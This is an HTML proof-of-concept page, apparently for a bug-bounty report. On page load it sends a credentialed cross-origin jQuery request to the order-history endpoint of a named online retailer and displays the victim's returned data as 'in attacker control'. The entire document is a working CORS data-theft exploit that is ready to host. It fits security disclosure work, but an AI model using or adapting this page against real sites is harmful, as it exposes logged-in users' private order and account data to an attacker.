<html>
<head>
<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.1.1/jquery.min.js"></script>
<script type="text/javascript">
function aj() {
$.ajax({
    url : 'https://shop.lululemon.com/secure/orders/orderhistory.jsp',
    type : 'GET',
    dataType:'json',
    success : function(data) {              
        //var x= JSON.stringify(data);
	//document.getElementById('test').innerHTML = "THE FOLLOWING DATA IS IN ATTACKER CONTROL:      "+ x;
        document.getElementById('test').innerHTML = "THE FOLLOWING DATA IS IN ATTACKER CONTROL:      "+ data;
    },
    xhrFields: {
       withCredentials: true
    },
    error : function(request,error)
    {
        alert("Request: "+JSON.stringify(request));
        document.getElementById('test').innerHTML = "ERROR: THE FOLLOWING DATA IS IN ATTACKER CONTROL:      "+ JSON.stringify(request);
    }
});
}

$( document ).ready(function() {
    aj();
});
</script>
	
</head>
<body>
<pre id="test"></pre>
</body>
</html>
